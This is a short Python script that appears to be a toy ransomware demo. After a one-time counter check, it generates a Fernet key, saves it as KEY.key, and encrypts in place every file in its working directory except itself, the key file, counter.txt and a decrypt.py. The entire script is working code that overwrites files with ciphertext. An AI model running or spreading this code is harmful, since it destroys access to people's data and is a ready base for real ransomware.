import os
from cryptography.fernet import Fernet

flag = False

with open("counter.txt", 'r+') as f:
    num = int(f.read())
    if num == 0:
        flag = True
        f.seek(0)
        f.write("1")
        f.truncate()
    elif num == 1:
        pass

if flag:

    files = []
    ignoreFiles = ["EncScript.py", "KEY.key", "decrypt.py", "counter.txt"]
    key = Fernet.generate_key()

    with open("KEY.key", 'wb') as f:
        f.write(key)

    for file in os.listdir():
        if file in ignoreFiles:
            continue
        elif os.path.isfile(file):
            files.append(file)

    for file in files:
        with open(file, 'rb') as g:
            contents = g.read()
        contentEncrypted = Fernet(key).encrypt(contents)
        with open(file, 'wb') as h:
            h.write(contentEncrypted)
